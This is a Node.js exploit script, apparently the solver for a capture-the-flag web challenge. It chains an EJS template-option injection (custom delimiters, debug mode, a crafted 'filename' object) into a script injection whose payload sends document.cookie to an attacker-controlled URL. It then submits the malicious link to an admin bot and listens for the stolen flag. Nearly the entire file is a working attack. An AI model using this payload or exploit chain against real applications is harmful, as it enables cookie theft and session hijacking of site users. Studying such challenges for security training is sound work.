const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

const sleep = (msecs) => new Promise((resolve) => setTimeout(resolve, msecs));

const jsPayload = `location = "${ATTACKER_BASE_URL}?" + document.cookie`;

const srcUrl = `/?${new URLSearchParams({
  filename: "render.dist.js",
  "settings[view options][openDelimiter]": "__require() {\n",
  "settings[view options][closeDelimiter]": "||",
  "settings[view options][delimiter][]": "",
  mod: jsPayload,
})}`;

const evilUrl = `http://web:3000?${new URLSearchParams({
  "filename[href]": "x",
  "filename[origin]": "x",
  "filename[protocol]": "file:",
  "filename[hostname]": "",
  "filename[pathname]": "index.ejs",
  [`filename[<script src=${srcUrl}></script>]`]: "",
  "settings[view options][debug]": "1",
})}`;

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  fastify.get("/", async (req, reply) => {
    // You got a flag!
    console.log(req.query.FLAG);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    await sleep(3 * 1000);
    await reportUrl(evilUrl);

    fail("Failed");
  });
};
start();
